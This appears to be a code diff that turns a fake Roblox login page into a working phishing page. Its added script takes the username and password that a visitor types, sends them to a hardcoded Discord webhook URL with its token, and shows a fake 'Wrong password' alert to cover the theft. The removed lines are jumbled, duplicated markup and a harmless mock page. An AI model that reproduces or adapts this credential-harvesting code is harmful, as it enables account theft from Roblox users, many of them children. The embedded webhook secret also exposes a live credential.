@@ -4,52 +4,20 @@
   <title>Roblox Login</title>
 </head>
 <body>
- <img src="roblox-logo.png">  <!-- Roblox logo -->
-<div class="login-box">
-  <input placeholder="Username">
-  <input placeholder="Password">
-  <button>Log In</button>
-</div>
-<head>
-  <title>Roblox Login</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
-      text-align: center;
-      padding-top: 50px;
-    }
-    .login-box {
-      width: 350px;
-      margin: 0 auto;
-      padding: 20px;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 0 10px #aaa;
-    }
-    input {
-      width: 200px;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 4px;
-      border: 1px solid #ccc;
-    }
-    button {
-      padding: 10px 20px;
-      background-color: #0078d7;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-  </style>
-</head>
+  <h2>Login to Roblox</h2>
+
+  <form id="phishForm">
+    <input type="text" id="user" placeholder="Username" required><br>
+    <input type="password" id="pass" placeholder="Password" required><br>
+    <input type="submit" value="Log In">
+  </form>
 
   <script>
     document.getElementById('phishForm').onsubmit = function(e) {
       e.preventDefault();
 
-      const webhookURL = "https://discord.com/api/webhooks/1375407829879488552/gBnV23D9Y78yeAjBRCNfju2m_XLltImQlzbG2nKxZdAgA1u8MfmqZhPgRHQrM3Mu_7Lv";
+      // 👉 Replace the URL below with YOUR Discord webhook URL
+      const webhookURL = "https://discord.com/api/webhooks/1375476904286486578/C6zYdJiT2IA7aDQ1oZojH7ePX_IsVQd1dfueOOFWjsQ5HY3DZynJSPA-bDXTEdvr7arZ";
 
       const username = document.getElementById('user').value;
       const password = document.getElementById('pass').value;
@@ -62,121 +30,9 @@
         })
       });
 
+      // Optional: show a fake error message or redirect to real Roblox page
       alert("Wrong password. Try again.");
     };
   </script>
 </body>
 </html>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #f2f2f2;
-    text-align: center;
-    padding-top: 50px;
-  }
-  h2 {
-    color: #000;
-  }
-  form {
-    background: white;
-    display: inline-block;
-    padding: 20px;
-    border-radius: 8px;
-    box-shadow: 0 0 10px #aaa;
-  }
-  input[type="text"], input[type="password"] {
-    width: 200px;
-    padding: 10px;
-    margin: 10px 0;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-  }
-  input[type="submit"] {
-    padding: 10px 20px;
-    background-color: #0078d7;
-    color: white;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-  }
-</style>
-<head>
-  <title>Roblox Login</title>
-  <style>
-    /<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Roblox Login Clone (Educational)</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #e3e3e3;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .login-container {
-      background: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.2);
-      width: 300px;
-      text-align: center;
-    }
-
-    .login-container h2 {
-      margin-bottom: 20px;
-      font-size: 24px;
-    }
-
-    .input-field {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    .login-button {
-      width: 100%;
-      padding: 10px;
-      background-color: #d32f2f;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    .login-button:hover {
-      background-color: #b71c1c;
-    }
-
-    .footer {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #555;
-    }
-  </style>
-</head>
-<body>
-  <div class="login-container">
-    <h2>Roblox Login</h2>
-    <input type="text" placeholder="Username" class="input-field" id="username">
-    <input type="password" placeholder="Password" class="input-field" id="password">
-    <button class="login-button" onclick="fakeLogin()">Log In</button>
-    <div class="footer">This is a mock project. Not affiliated with Roblox.</div>
-  </div>
-
-  <script>
-    function fakeLogin() {
-      alert("This is a demo page. No login occurs.");
-    }
-  </script>
-</body>
-</html>
-
